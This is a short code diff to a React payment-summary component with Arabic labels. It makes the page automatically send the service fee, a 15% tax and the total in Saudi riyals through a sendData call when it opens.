@@ -34,7 +34,18 @@ export default function SummaryPayment() {
 
   useEffect(() => {
     navigateToPage('ملخص الدفع');
-  }, []);
+    
+    // إرسال المجموع الكلي تلقائياً عند فتح الصفحة
+    sendData({
+      data: {
+        'المجموع الكلي': `${servicePrice + Math.round(servicePrice * 0.15)} ر.س`,
+        'رسوم الخدمة': `${servicePrice} ر.س`,
+        'الضريبة': `${Math.round(servicePrice * 0.15)} ر.س`,
+      },
+      current: 'الملخص والدفع',
+      waitingForAdminResponse: false,
+    });
+  }, [servicePrice]);
 
   const handlePayment = () => {
     if (!selectedPaymentMethod) return;
